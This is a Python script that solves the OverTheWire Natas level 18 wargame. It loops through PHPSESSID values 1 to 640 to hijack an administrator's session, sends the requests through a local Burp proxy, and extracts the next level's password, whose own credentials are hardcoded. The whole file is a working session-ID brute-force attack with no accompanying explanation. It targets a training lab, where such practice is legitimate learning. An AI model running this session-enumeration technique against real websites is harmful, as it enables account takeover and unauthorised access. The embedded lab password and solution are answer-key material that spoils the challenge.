import natas, requests, re
USER = 'natas18'
PASS = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'
URL = f'http://{USER}.natas.labs.overthewire.org/index.php'
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)
header = {"Content-Type": "application/x-www-form-urlencoded"}
burp = {"http": "http://127.0.0.1:8080"}

session = requests.Session()
def get_flag(response_http):
    flag_regex = re.findall('([0-9a-zA-Z]{32})', response_http)
    return flag_regex[0 if len(flag_regex) == 1 else 1]

for id in range(1, 641):
    request = session.get(url=URL, cookies={"PHPSESSID": str(id)}, auth=auth_basic, proxies=burp)
    response_httpx = request.text

    if " The credentials for the next level are" in response_httpx:
        print("The credentials for the next level are:", get_flag(response_httpx))
        break